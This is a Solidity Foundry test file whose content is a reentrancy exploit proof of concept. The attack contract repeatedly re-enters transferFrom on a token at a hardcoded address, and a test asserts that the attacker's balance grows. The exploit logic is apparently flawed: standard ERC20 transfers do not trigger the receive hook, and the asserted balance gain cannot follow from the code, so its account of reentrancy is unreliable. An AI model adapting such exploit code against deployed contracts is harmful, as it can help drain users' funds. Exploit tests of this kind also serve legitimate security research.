// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

contract ReentrancyAttack {
    IERC20 public token;
    address public owner;
    uint256 public attackAmount;
    uint256 public reentrancyCount;
    uint256 public constant MAX_REENTRANCY = 10;

    constructor(address _token) {
        token = IERC20(_token);
        owner = msg.sender;
    }

    function startAttack(uint256 amount) external {
        require(msg.sender == owner, "Not owner");
        attackAmount = amount;
        reentrancyCount = 0;

        // Start first transfer
        token.transferFrom(owner, address(this), attackAmount);
    }

    // Fallback function - if token contract calls us during transfer
    receive() external payable {
        reentrancyCount++;

        if (reentrancyCount < MAX_REENTRANCY) {
            // Re-enter transferFrom
            token.transferFrom(owner, address(this), attackAmount);
        }
    }

    // To withdraw tokens after attack
    function withdrawTokens() external {
        require(msg.sender == owner, "Not owner");
        uint256 balance = token.balanceOf(address(this));
        if (balance > 0) {
            token.transfer(owner, balance);
        }
    }
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x19d726cd37CA413adf46D9Ae555aB5A5643EdF20;
    address attacker = address(this);
    ReentrancyAttack attackContract;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Create malicious contract
        attackContract = new ReentrancyAttack(TARGET);

        // Give attacker some tokens
        uint256 initialBalance = 1000 * 10**18;
        deal(TARGET, attacker, initialBalance);

        // Approve attack contract to spend attacker's tokens
        IERC20(TARGET).approve(address(attackContract), type(uint256).max);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(TARGET).balanceOf(address(this));
        // Start attack
        attackContract.startAttack(initialBalance / 2);

        // Withdraw tokens from attack contract back to attacker
        attackContract.withdrawTokens();

        // Check if attack increased our balance
        uint256 finalBalance = IERC20(TARGET).balanceOf(attacker);
        assertGt(finalBalance, initialBalance, "Balance should increase due to reentrancy");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
